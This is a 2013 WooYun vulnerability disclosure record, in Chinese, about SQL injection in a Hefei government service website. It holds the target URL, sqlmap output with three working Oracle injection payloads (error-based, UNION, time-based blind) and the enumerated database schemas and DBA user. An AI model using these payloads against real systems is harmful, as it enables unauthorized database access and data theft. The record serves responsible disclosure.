{"id": 61362, "wybug_id": "wooyun-2013-039864", "wybug_title": "合肥某政府服务网站sql注入漏洞", "wybug_corp": "合肥某政府服务网", "wybug_author": "瞧瞧", "wybug_date": "2013-10-16 10:32", "wybug_open_date": "2013-11-30 10:33", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-30：\t细节向公众公开  简要描述： 合肥某政府服务网站sql注入漏洞，后台信息泄露 详细说明：  http://www.hf12345.gov.cn/Report-ResultAction.do?reportId=fc081f7f-cce8-4fa1-8518-b498476ea9c3&newReport=true&subjectId=47ac981594614fe6b7480fe88c6d5fc7 subjectId存在注入漏洞   漏洞证明：  sqlmap identified the following injection points with a total of 41 HTTP(s) requests:---Place: GETParameter: subjectId    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: reportId=fc081f7f-cce8-4fa1-8518-b498476ea9c3&newReport=true&subjectId=47ac981594614fe6b7480fe88c6d5fc7' AND 3584=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(102)||CHR(118)||CHR(101)||CHR(113)||(SELECT (CASE WHEN (3584=3584) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(100)||CHR(122)||CHR(119)||CHR(113)||CHR(62))) FROM DUAL) AND 'kZTU'='kZTU    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: reportId=fc081f7f-cce8-4fa1-8518-b498476ea9c3&newReport=true&subjectId=47ac981594614fe6b7480fe88c6d5fc7' UNION ALL SELECT CHR(113)||CHR(102)||CHR(118)||CHR(101)||CHR(113)||CHR(83)||CHR(119)||CHR(89)||CHR(116)||CHR(80)||CHR(105)||CHR(73)||CHR(85)||CHR(100)||CHR(88)||CHR(113)||CHR(100)||CHR(122)||CHR(119)||CHR(113),NULL FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: reportId=fc081f7f-cce8-4fa1-8518-b498476ea9c3&newReport=true&subjectId=47ac981594614fe6b7480fe88c6d5fc7' AND 1137=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(99)||CHR(78)||CHR(99),5) AND 'IWrs'='IWrs---web application technology: Servlet 3.0, JSP, JSP 2.2back-end DBMS: Oraclecurrent user:    'HF12345'current user is DBA:    Trueavailable databases [22]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] HF12345[*] HR[*] IX[*] MDSYS[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] UNIEAP[*] WMSYS[*] XDBHF12345库MXKJUSER表中存在各单位的用户表等信息   修复方案：  sql注入都一样，做输入检查吧   版权声明：转载请注明来源 瞧瞧@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-10-20 19:04 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}